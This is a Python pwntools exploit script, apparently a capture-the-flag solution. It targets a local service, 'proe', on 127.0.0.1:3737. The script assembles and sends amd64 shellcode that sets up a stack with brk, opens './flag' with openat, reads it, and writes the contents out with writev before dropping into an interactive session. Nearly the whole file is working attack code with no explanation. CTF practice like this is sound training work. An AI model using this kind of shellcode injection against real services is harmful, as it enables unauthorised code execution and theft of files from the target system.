#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("./proe")
# context.log_level='debug'
p = remote("127.0.0.1", 3737)
# p = process([exe.path])
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def createbuff(buffer):
    # buffer = b"./flag.txt\0"
    chunk_size = 8
    chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
    chunks.reverse()
    string = ""
    for i in range(len(chunks)):
        value = u64(chunks[i].ljust(8,b"\0"))
        string +=  f'mov rdi, {value}\npush rdi\n'
    return string
# print(string)
shellcode = asm(f"""
                mov rax, 0xc
                syscall
                mov rsp, rax
                sub rsp, 0x200
                {createbuff(b'./flag\0')}
                mov rdi, -100
                mov rsi, rsp
                mov rdx, 0
                mov rax, 0x101
                syscall
                mov rdi, rax
                mov rdx, 0x200
                mov rax, 0x11
                syscall
                //push 0x200
                //push rsi
                //mov rsi, rsp
                //mov rdi, 1
                //mov rdx, 1
                //mov rax, 0x14
                //syscall
         mov edi, 5
         push 0x100
         push rsi
         mov rsi, rsp
         mov rdx, 1
         xor rax, rax
         mov ax, 0x14
         syscall
                
                


                """,arch="amd64")

# gdbs()
print(f"len shell: {len(shellcode)}")
sla(":",shellcode)







p.interactive()
# good luck pwning :)

